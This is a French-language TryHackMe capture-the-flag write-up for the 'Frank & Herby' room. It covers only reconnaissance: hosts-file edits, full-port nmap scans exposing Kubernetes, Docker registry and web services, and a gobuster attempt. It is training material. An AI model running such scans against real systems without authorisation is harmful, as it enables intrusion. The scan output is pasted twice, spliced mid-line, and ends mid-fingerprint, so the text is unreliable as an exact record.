# Frank & Herby make an app #

## Task 1 Frank & Herb Make an App! ##  

```bash
sudo sh -c "echo '10.10.131.64 frank.thm ' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ nmap_all frank.thm
sudo nmap -A frank.thm -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 17:19 CET
Nmap scan report for frank.thm (10.10.131.64)
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
25000/tcp open  ssl/http Gunicorn 19.7.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.131.64, IP Address:172.17.0.1
| Not valid before: 2021-11-05T16:19:19
|_Not valid after:  2022-11-05T16:19:19
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/5%OT=22%CT=1%CU=44637%PV=Y%DS=2%DC=T%G=Y%TM=618559C
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O
OS:3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   31.11 ms 10.9.0.1
2   31.25 ms frank.thm (10.10.131.64)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.43 seconds


```

Nmap nous montre 2 services qui sont :  
Le service SSH sur le port 22.   
Le service HTTPS sur le port 25000.   

```bash
tim@kali:~/Bureau/tryhackme$ gobuster dir -u https://frank.thm:25000 -w /usr/share/dirb/wordlists/common.txt -q
Error: error on running gobuster: unable to connect to https://frank.thm:25000/: invalid certificate: x509: certificate is valid for kubernetes, kubernetes.default, kubernetes.default.svc, kubernetes.default.svc.cluster, kubernetes.default.svc.cluster.local, not frank.thm
```

Quand on essaie d'énumérer le port 25000 on nous dit que le certificat n'est pas valide pour d'autre nom de domaine qui sont :  kubernetes, kubernetes.default, kubernetes.default.svc, kubernetes.default.svc.cluster, kubernetes.default.svc.cluster.local

```bash
sudo sh -c "echo '10.10.203.102 kubernetes ' >> /etc/hosts"
```

On ajoute le domaine kubernetes dans le hosts.   

```bash
tim@kali:~/Bureau/tryhackme$ nmap_all kubernetes
sudo nmap -A kubernetes -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 11:08 CET
Nmap scan report for kubernetes (10.10.203.102)
Host is up (0.035s latency).
Other addresses for kubernetes (not scanned): 10.10.203.102
rDNS record for 10.10.203.102: frank.thm
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: ei69Tx9poNnA3S7QB
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 06 Nov 2021 10:09:33 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Not valid before: 2021-10-03T14:32:12
|_Not valid after:  2022-10-03T14:32:12
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:39 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:40 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1636191314
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2021-11-06T08:35:13
|_Not valid after:  2022-11-06T08:35:13
10259/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:39 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:40 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1636191314
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2021-11-06T08:35:13
|_Not valid after:  2022-11-06T08:35:13
16443/tcp open  ssl/unknown
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.203.102, IP Address:172.17.0.1
| Not valid before: 2021-11-06T07:44:54
|_Not valid after:  2022-11-06T07:44:54
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 06 Nov 2021 10:10:06 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 06 Nov 2021 10:09:39 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 06 Nov 2021 10:09:40 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.203.102, IP Address:172.17.0.1
| Not valid before: 2021-11-06T07:44:54
|_Not valid after:  2022-11-06T07:44:54
|_ssl-date: TLS randomness does not represent time
31337/tcp open  http        nginx 1.21.3
|_http-server-header: nginx/1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
32000/tcp open  http        Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.92%I=7%D=11/6%Time=6186545D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,31C4,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20sameorigin\r\nCon
SF:tent-Security-Policy:\x20default-src\x20'self'\x20;\x20connect-src\x20\
SF:*;\x20font-src\x20'self'\x20\x20data:;\x20frame-src\x20\*;\x20img-src\x
SF:20\*\x20data:;\x20media-src\x20\*\x20data:;\x20script-src\x20'self'\x20
SF:'unsafe-eval'\x20;\x20style-src\x20'self'\x20'unsafe-inline'\x20\r\nX-I
SF:nstance-ID:\x20ei69Tx9poNnA3S7QB\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Sat,\x2006\x20Nov\x20
SF:2021\x2010:09:33\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/
SF:css\"\x20class=\"__meteor-css__\"\x20href=\"/a3e89fa2bdd3f98d52e474085b
SF:b1d61f99c0684d\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"ut
SF:f-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/h
SF:tml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20con
SF:tent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content
SF:=\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>
SF:\n\t<meta\x20name=\"distribution\"\x20content")%r(HTTPOptions,31C4,"HTT
SF:P/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20sameorigin\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'self'\x20;\x20connect-src\x20\*;\x20font-src\x20
SF:'self'\x20\x20data:;\x20frame-src\x20\*;\x20img-src\x20\*\x20data:;\x20
SF:media-src\x20\*\x20data:;\x20script-src\x20'self'\x20'unsafe-eval'\x20;
SF:\x20style-src\x20'self'\x20'unsafe-inline'\x20\r\nX-Instance-ID:\x20ei6
SF:9Tx9poNnA3S7QB\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:
SF:\x20Accept-Encoding\r\nDate:\x20Sat,\x2006\x20Nov\x202021\x2010:09:33\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>
SF:\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20class=\"_
SF:_meteor-css__\"\x20href=\"/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d\.cs
SF:s\?meteor_css_resource=true\">\n<meta\x20charset=\"utf-8\"\x20/>\n\t<me
SF:ta\x20http-equiv=\"content-type\"\x20content=\"text/html;\x20charset=ut
SF:f-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20content=\"-1\"\x20/>\
SF:n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\"\x20/>
SF:\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\n\t<meta\x20name=
SF:\"distribution\"\x20content");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10257-TCP:V=7.92%T=SSL%I=7%D=11/6%Time=61865464%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,170,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:39\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},
SF:\"code\":403}\n")%r(HTTPOptions,174,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:40\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Termina
SF:lServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10259-TCP:V=7.92%T=SSL%I=7%D=11/6%Time=61865464%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,170,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:39\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20get\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},
SF:\"code\":403}\n")%r(HTTPOptions,174,"HTTP/1\.0\x20403\x20Forbidden\r\nC
SF:ache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application/j
SF:son\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2006\x20Nov
SF:\x202021\x2010:09:40\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":
SF:\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\"
SF:,\"message\":\"forbidden:\x20User\x20\\\"system:anonymous\\\"\x20cannot
SF:\x20options\x20path\x20\\\"/\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Termina
SF:lServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400tim@kali:~/Bureau/tryhackme$ nmap_all kubernetes
sudo nmap -A kubernetes -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 11:08 CET
Nmap scan report for kubernetes (10.10.203.102)
Host is up (0.035s latency).
Other addresses for kubernetes (not scanned): 10.10.203.102
rDNS record for 10.10.203.102: frank.thm
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: ei69Tx9poNnA3S7QB
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 06 Nov 2021 10:09:33 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Not valid before: 2021-10-03T14:32:12
|_Not valid after:  2022-10-03T14:32:12
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:39 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:40 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1636191314
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2021-11-06T08:35:13
|_Not valid after:  2022-11-06T08:35:13
10259/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:39 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Sat, 06 Nov 2021 10:09:40 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1636191314
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2021-11-06T08:35:13
|_Not valid after:  2022-11-06T08:35:13
16443/tcp open  ssl/unknown
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.203.102, IP Address:172.17.0.1
| Not valid before: 2021-11-06T07:44:54
|_Not valid after:  2022-11-06T07:44:54
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 06 Nov 2021 10:10:06 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 06 Nov 2021 10:09:39 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Sat, 06 Nov 2021 10:09:40 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.203.102, IP Address:172.17.0.1
| Not valid before: 2021-11-06T07:44:54
|_Not valid after:  2022-11-06T07:44:54
|_ssl-date: TLS randomness does not represent time
31337/tcp open  http        nginx 1.21.3
|_http-server-header: nginx/1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
32000/tcp open  http        Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.92%I=7%D=11/6%Time=6186545D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,31C4,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20sameorigin\r\nCon
